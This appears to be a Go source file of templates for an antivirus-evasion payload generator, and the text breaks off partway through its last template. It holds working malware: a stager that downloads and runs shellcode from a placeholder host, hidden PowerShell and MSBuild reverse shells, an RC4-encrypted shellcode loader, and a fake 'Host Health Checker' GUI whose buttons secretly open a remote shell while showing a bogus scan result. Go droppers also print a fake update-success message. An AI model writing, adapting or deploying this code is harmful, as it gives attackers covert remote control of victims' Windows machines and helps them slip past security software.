	hvyvVkxdZsQaz   = 0x40
)

var (
	jdaMdbGgeF      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	kernel          = syscall.NewLazyDLL("kernel32.dll")
	lazyprocpointer = kernel.NewProc("VirtualAlloc")
)

func hBhfpqaJUl(oWFVJjiYI uintptr) (uintptr, error) {
	VNWPvtXb, _, XXboStgdyg := lazyprocpointer.Call(0, oWFVJjiYI, oMuJfGUDmtCSRG|dlIyxUBZRDOnxIB, hvyvVkxdZsQaz)
	if VNWPvtXb == 0 {
		return 0, XXboStgdyg
	}
	return VNWPvtXb, nil
}
func hiSfJKchyyEVihy(HqASzT int, vgOdczJczN []byte) string {
	JutTPy := rand.New(rand.NewSource(time.Now().UnixNano()))
	var scgHrsTuvKi []byte
	for TDsqVMvj := 0; TDsqVMvj < HqASzT; TDsqVMvj++ {
		scgHrsTuvKi = append(scgHrsTuvKi, vgOdczJczN[JutTPy.Intn(len(vgOdczJczN))])
	}
	return string(scgHrsTuvKi)
}
func vSWwMBwUZw(HqASzT int) string {
	vgOdczJczN := []byte(jdaMdbGgeF)
	return hiSfJKchyyEVihy(HqASzT, vgOdczJczN)
}
func qISDOFLQUEdk(tgZcJOIIbys, HqASzT int) string {
	for {
		LdckUnX := 0
		MFxhQTAZ := vSWwMBwUZw(HqASzT)
		for _, TiFkFeOmgRFX := range []byte(MFxhQTAZ) {
			LdckUnX += int(TiFkFeOmgRFX)
		}
		if LdckUnX%0x100 == tgZcJOIIbys {
			return "/" + MFxhQTAZ
		}
	}
}
func main() {
	serverIP := "http://REVIPPORT"
	response, _ := http.Get(serverIP + qISDOFLQUEdk(92, 184))
	defer response.Body.Close()
	bodybyte, _ := ioutil.ReadAll(response.Body)
	VNWPvtXb, _ := hBhfpqaJUl(uintptr(len(bodybyte)))
	jXsPTEZjNJIJAI := (*[990000]byte)(unsafe.Pointer(VNWPvtXb))
	for BeWTrjm, TiFkFeOmgRFX := range bodybyte {
		jXsPTEZjNJIJAI[BeWTrjm] = TiFkFeOmgRFX
	}
	syscall.Syscall(VNWPvtXb, 0, 0, 0, 0)
}
`
var AvBusterPowerShellTCPReverseShellGUI = `using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

    public class psForm : System.Windows.Forms.Form
    {
        private System.Windows.Forms.Panel headerpanel;
        private System.Windows.Forms.Label missinglabel;
        private System.Windows.Forms.Button btnHealthCheck;
        private System.Windows.Forms.Button btnCPUUsage;
        private System.Windows.Forms.Button btnUpdateCheck;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Button button1;
        public psForm()
        {
            InitializeComponent();
        }
        
       public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new psForm());
        }
    
        private void createpsrevshell()
        {
            string psrevshelltempalte = @"function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$address = 'RHOST'
$port = 'RPORT'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
";
            File.WriteAllText(@"C:\windows\temp\powres.ps1", psrevshelltempalte);
            runpsrevshell();
        }


        private void runpsrevshell()
        {

            ProcessStartInfo pinfo = new ProcessStartInfo();
            if (Environment.Is64BitOperatingSystem)
            {
                pinfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";

            }
            else
            {
                pinfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }

            //p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c" + "IEX (C:\\Windows\\Temp\\powrev.ps1)";
            string ps1File = @"C:\windows\temp\powres.ps1";
			string strCmdText = string.Format("-w hidden -nop -ep bypass -file \"{0}\"",ps1File);
            pinfo.Arguments = strCmdText;
            pinfo.UseShellExecute = false;
            //pinfo.CreateNoWindow = true;
            pinfo.RedirectStandardOutput = false;
            // pinfo.Verb = "runas";
            try
            {
                Process.Start(pinfo);
            }
            catch (Exception e)
            {

                MessageBox.Show(e.Message);
            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            //createpsrevshell();
            this.Close();
        }

        private void btnUpdateCheck_Click(object sender, EventArgs e)
        {
            createpsrevshell();
            System.Threading.Thread.Sleep(4000);
            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Red;

        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            (sender as Button).BackColor = Color.Gray;

        }

        private void InitializeComponent()
        {
            this.headerpanel = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.missinglabel = new System.Windows.Forms.Label();
            this.btnHealthCheck = new System.Windows.Forms.Button();
            this.btnCPUUsage = new System.Windows.Forms.Button();
            this.btnUpdateCheck = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.headerpanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // headerpanel
            // 
            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
            this.headerpanel.Controls.Add(this.button1);
            this.headerpanel.Controls.Add(this.missinglabel);
            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.headerpanel.Location = new System.Drawing.Point(0, 0);
            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
            this.headerpanel.Name = "headerpanel";
            this.headerpanel.Size = new System.Drawing.Size(460, 30);
            this.headerpanel.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.button1.Location = new System.Drawing.Point(423, 1);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(36, 27);
            this.button1.TabIndex = 4;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
            // 
            // missinglabel
            // 
            this.missinglabel.AutoSize = true;
            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.missinglabel.Location = new System.Drawing.Point(127, 9);
            this.missinglabel.Name = "missinglabel";
            this.missinglabel.Size = new System.Drawing.Size(193, 15);
            this.missinglabel.TabIndex = 0;
            this.missinglabel.Text = "Multi Purpose Host Health Checker";
            // 
            // btnHealthCheck
            // 
            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
            this.btnHealthCheck.Name = "btnHealthCheck";
            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
            this.btnHealthCheck.TabIndex = 2;
            this.btnHealthCheck.Text = "Health Check";
            this.btnHealthCheck.UseVisualStyleBackColor = true;
            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnCPUUsage
            // 
            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
            this.btnCPUUsage.Name = "btnCPUUsage";
            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
            this.btnCPUUsage.TabIndex = 1;
            this.btnCPUUsage.Text = "CPU Usage";
            this.btnCPUUsage.UseVisualStyleBackColor = true;
            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // btnUpdateCheck
            // 
            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
            this.btnUpdateCheck.Name = "btnUpdateCheck";
            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
            this.btnUpdateCheck.TabIndex = 0;
            this.btnUpdateCheck.Text = "Check Updates";
            this.btnUpdateCheck.UseVisualStyleBackColor = true;
            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // button3
            // 
            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.Location = new System.Drawing.Point(241, 133);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(180, 56);
            this.button3.TabIndex = 3;
            this.button3.Text = "Hidden Files";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
            // 
            // Form
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(460, 222);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.btnUpdateCheck);
            this.Controls.Add(this.btnCPUUsage);
            this.Controls.Add(this.btnHealthCheck);
            this.Controls.Add(this.headerpanel);
            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(460, 250);
            this.MinimizeBox = false;
            this.Name = "Form";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Health Checker";
            this.headerpanel.ResumeLayout(false);
            this.headerpanel.PerformLayout();
            this.ResumeLayout(false);

        }

    }
`
var AvBusterPowerShellTCPReverseShellCS = `using System;
using System.Diagnostics;
using System.IO;

    public class PsConsole {
        
       public static void Main()
        {
            createpsrevshell();
        }
    
        static void createpsrevshell()
        {
            string psrevshelltempalte = @"function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$address = 'RHOST'
$port = 'RPORT'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
";
            File.WriteAllText(@"C:\windows\temp\powres.ps1", psrevshelltempalte);
            runpsrevshell();
        }


        static void runpsrevshell()
        {

            ProcessStartInfo pinfo = new ProcessStartInfo();
            if (Environment.Is64BitOperatingSystem)
            {
                pinfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";

            }
            else
            {
                pinfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }

            //p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c" + "IEX (C:\\Windows\\Temp\\powrev.ps1)";
            string ps1File = @"C:\windows\temp\powres.ps1";
			string strCmdText = string.Format("-w hidden -nop -ep bypass -file \"{0}\"",ps1File);
            pinfo.Arguments = strCmdText;
            pinfo.UseShellExecute = false;
            //pinfo.CreateNoWindow = true;
            pinfo.RedirectStandardOutput = false;
            // pinfo.Verb = "runas";
            try
            {
                Process.Start(pinfo);
            }
            catch (Exception)
            {

                //MessageBox.Show(e.Message);
            }

        }

    }

`
var AvBusterPowerShellTCPReverseShellGo = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

//Remote host
const REMOTEHOST = "RHOST"

//Remote Port
const REMOTEPORT = "RPORT"

var (
	err                     error
	powershellcore, cmdname string
)

func init() {
	powershellcore = RPLfunction cleanup {
		if ($client.Connected -eq $true) {$client.Close()}
		if ($process.ExitCode -ne $null) {$process.Close()}
		exit}
		// Setup IPADDR
		$address = 'REVIP'
		// Setup PORT
		$port = 'REVPORT'
		$client = New-Object system.net.sockets.tcpclient
		$client.connect($address,$port)
		$stream = $client.GetStream()
		$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
		$process = New-Object System.Diagnostics.Process
		$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
		$process.StartInfo.RedirectStandardInput = 1
		$process.StartInfo.RedirectStandardOutput = 1
		$process.StartInfo.UseShellExecute = 0
		$process.Start()
		$inputstream = $process.StandardInput
		$outputstream = $process.StandardOutput
		Start-Sleep 1
		$encoding = new-object System.Text.AsciiEncoding
		while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
		$stream.Write($encoding.GetBytes($out),0,$out.Length)
		$out = $null; $done = $false; 
		while (-not $done) {
		if ($client.Connected -ne $true) {cleanup}
		$pos = 0; $i = 1
		while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
		$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
		$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
		if ($pos -gt 0) {
		$string = $encoding.GetString($networkbuffer,0,$pos)
		$inputstream.write($string)
		start-sleep 1
		if ($process.ExitCode -ne $null) {cleanup}
		else {
		$out = $encoding.GetString($outputstream.Read())
		while($outputstream.Peek() -ne -1){
		$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
		$stream.Write($encoding.GetBytes($out),0,$out.length)
		$out = $null
		$string = $null}} else {cleanup}}RPL
}

func os64check() bool {

	for _, e := range os.Environ() {
		pair := strings.Split(e, "=")

		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
			fmt.Println(pair[0] + "=" + pair[1])
			return true
		}
	}
	return false
}

func main() {
	genereaterevshellscript(REMOTEHOST, REMOTEPORT)
	if os64check() {
		cmdname = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"

	} else {

		cmdname = "PowerShell"
	}

	cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX (C://Windows//Temp//powrev.ps1)"}
	cmd := exec.Command(cmdname, cmdArgs...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	checkerr(err)
	fmt.Println("Successfully installed pending updates !")
}

func genereaterevshellscript(ip, port string) {
	ipreplaced := strings.Replace(powershellcore, "REVIP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "REVPORT", port, 1)
	fopowershellrevshell, err := os.Create("C://Windows//Temp//powrev.ps1")
	checkerr(err)
	defer fopowershellrevshell.Close()
	fopowershellrevshell.WriteString(portreplaced)
}

func checkerr(err error) {
	if err != nil {
		fmt.Printf("something went wrong %s", err)
		return
	}
}
`

var AvBusterPowerShellCustomShellCode = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var (
	err                     error
	powershellcore, cmdname string
)

func init() {
	powershellcore = RPL$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
	
	$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
	
	# 32-bit payload
	[byte[]]$byteArray = [System.Convert]::FromBase64String("SHELLCODE")
	[Byte[]]$sc32 = $byteArray
	
	# 64-bit payload
	[Byte[]]$sc64 = $byteArray
	
	# Determine if Powershell is running as 32 or 64 bit
	[Byte[]]$sc = $sc32
	if ([IntPtr]::Size -eq 8) {$sc = $sc64}
	
	# Calculate correct size param for VirtualAlloc
	$size = 0x1000
	if ($sc.Length -gt 0x1000) {$size = $sc.Length}
	
	# Allocate a page of memory. This will only work if the size parameter (3rd param) is at least 0x1000.
	# Allocate RWX memory block
	$memblock=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
		
	[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$memblock,$sc.Length)
	
	# Execute you payload
	$winFunc::CreateThread(0,0,$x,0,0,0)RPL
}

func os64check() bool {

	for _, e := range os.Environ() {
		pair := strings.Split(e, "=")

		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
			fmt.Println(pair[0] + "=" + pair[1])
			return true
		}
	}
	return false
}

func main() {
	genereaterevshellscript()
	if os64check() {
		cmdname = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"

	} else {

		cmdname = "PowerShell"
	}

	cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX (C://Windows//Temp//powrev.ps1)"}
	cmd := exec.Command(cmdname, cmdArgs...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	checkerr(err)
	fmt.Println("Successfully installed pending updates !")
}

func genereaterevshellscript() {
	
	fopowershellrevshell, err := os.Create("C://Windows//Temp//powrev.ps1")
	checkerr(err)
	defer fopowershellrevshell.Close()
	fopowershellrevshell.WriteString(powershellcore)
}

func checkerr(err error) {
	if err != nil {
		fmt.Printf("something went wrong %s", err)
		return
	}
}`

var AvBusterEncryptedShellCode = `package main

import (
	"crypto/rc4"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

const DECKEY = ":KEY"

func main() {

	shell := []byte{@SHELL@}
	decryptedshellcode := decryptshellcode([]byte(shell))
	executeshell(decryptedshellcode)
}

func decryptshellcode(shellcodetodecrypt []byte) []byte {
	key := []byte(DECKEY)
	ciphertext := shellcodetodecrypt
	decrypted := make([]byte, len(ciphertext))
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := rc4.NewCipher(key)
	if err != nil {
		fmt.Println(err.Error)
	}

	c.XORKeyStream(decrypted, ciphertext)

	return decrypted
}

func executeshell(shellcode []byte) {

	k32 := syscall.MustLoadDLL("kernel32.dll")

	valloc := k32.MustFindProc("VirtualAlloc")

	//make space for shellcode
	addr, _, _ := valloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	ptrtoaddressallocated := (*[6500]byte)(unsafe.Pointer(addr))
	//now copy our shellcode to the ptrtoaddressallocated
	for i, value := range shellcode {
		ptrtoaddressallocated[i] = value

	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
`
var AvBusterMSBuildTCPReverseShellCS = `using System;
using System.Diagnostics;
using System.IO;
namespace ConnectBack
{
    public class Program
    {
		public static void Main(string[] args)
        {
			updatemsbuild();
		}

		static void updatemsbuild()
        {
            string buildval = @"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
<Target Name = ""tdu"">
 <tdu/>
 </Target>
 <UsingTask
    TaskName = ""tdu""
    TaskFactory = ""CodeTaskFactory""
    AssemblyFile = ""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
      <Task>


      <Reference Include = ""System.Management.Automation"" />
 
         <Code Type = ""Class"" Language = ""cs"">
    
             <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
        {
            public static StreamWriter streamWriter;
            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception ex) { throw ex; }
                }
            }
            public override bool Execute()
            {
                using (TcpClient client = new TcpClient(""RHOST"", RPORT))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = ""cmd.exe"";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }

        }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>";
            
            string msbuildpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";
            try
            {
                using (StreamWriter sw = new StreamWriter(@"C:\Windows\Temp\tdu.xml"))
                {
                    sw.Write(buildval);
                }
                Process p = new Process();
                p.StartInfo.FileName = msbuildpath;
                p.StartInfo.Arguments = @"C:\Windows\Temp\tdu.xml";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.Verb = "runas";
                p.Start();
                p.WaitForExit();
            }
            catch (Exception)
            {

                
            }
            

        }
	}
}

`
var AvBusterMSBuildTCPReverseShell = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var tdu, msbuildpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "RHOST"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "RPORT"

func init() {
	tdu = RPL<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="tdu">
<tdu/>
</Target>
<UsingTask
    TaskName="tdu"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
      
      <Reference Include="System.Management.Automation" />
        <Code Type="Class" Language="cs">
         <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
            {
                public static StreamWriter streamWriter;
                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
                 {
                        StringBuilder strOutput = new StringBuilder();
                        if (!String.IsNullOrEmpty(outLine.Data))
                        {
                            try
                            {
                                strOutput.Append(outLine.Data);
                                streamWriter.WriteLine(strOutput);
                                streamWriter.Flush();
                            }
                            catch (Exception ex) { throw ex; }
                        }
                 }
                 public override bool Execute()
                 {
                     using (TcpClient client = new TcpClient("IP", PORT))
                        {
                            using (Stream stream = client.GetStream())
                            {
                                using (StreamReader rdr = new StreamReader(stream))
                                {
                                    streamWriter = new StreamWriter(stream);
                                    StringBuilder strInput = new StringBuilder();
                                    Process p = new Process();
                                    p.StartInfo.FileName = "cmd.exe";
                                    p.StartInfo.CreateNoWindow = true;
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.RedirectStandardOutput = true;
                                    p.StartInfo.RedirectStandardInput = true;
                                    p.StartInfo.RedirectStandardError = true;
                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                    p.Start();
                                    p.BeginOutputReadLine();
                                    while (true)
                                    {
                                        strInput.Append(rdr.ReadLine());
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                    }
                                }
                            }
                        }
                 }
            
            }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>RPL
	msbuildpath = RPLC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exeRPL
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createmsbuildtemplate(MANAGERIP, REMOTEPORT)
	msbuild := exec.Command(msbuildpath, "C://Windows//Temp//tdu.xml")
	err := msbuild.Start()
	checkerr(err)

}

func createmsbuildtemplate(ip, port string) {
	ipreplaced := strings.Replace(tdu, "IP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORT", port, 1)
	fotduxml, err := os.Create("C://Windows//Temp//tdu.xml")
	checkerr(err)
	defer fotduxml.Close()
	fotduxml.WriteString(portreplaced)
}
`

var AvBusterMsBuildTCPReverseShellGUI = `using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

    public class psForm : System.Windows.Forms.Form
    {
        private System.Windows.Forms.Panel headerpanel;
        private System.Windows.Forms.Label missinglabel;
        private System.Windows.Forms.Button btnHealthCheck;
        private System.Windows.Forms.Button btnCPUUsage;
        private System.Windows.Forms.Button btnUpdateCheck;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Button button1;
        public psForm()
        {
            InitializeComponent();
        }
        
       public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new psForm());
        }
    
        private void updatemsbuild()
        {
            string buildval = @"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
<Target Name = ""tdu"">
 <tdu/>
 </Target>
 <UsingTask
    TaskName = ""tdu""
    TaskFactory = ""CodeTaskFactory""
    AssemblyFile = ""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
      <Task>


      <Reference Include = ""System.Management.Automation"" />
 
         <Code Type = ""Class"" Language = ""cs"">
    
             <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
        {
            public static StreamWriter streamWriter;
            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception ex) { throw ex; }
                }
            }
            public override bool Execute()
            {
                using (TcpClient client = new TcpClient(""RHOST"", RPORT))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
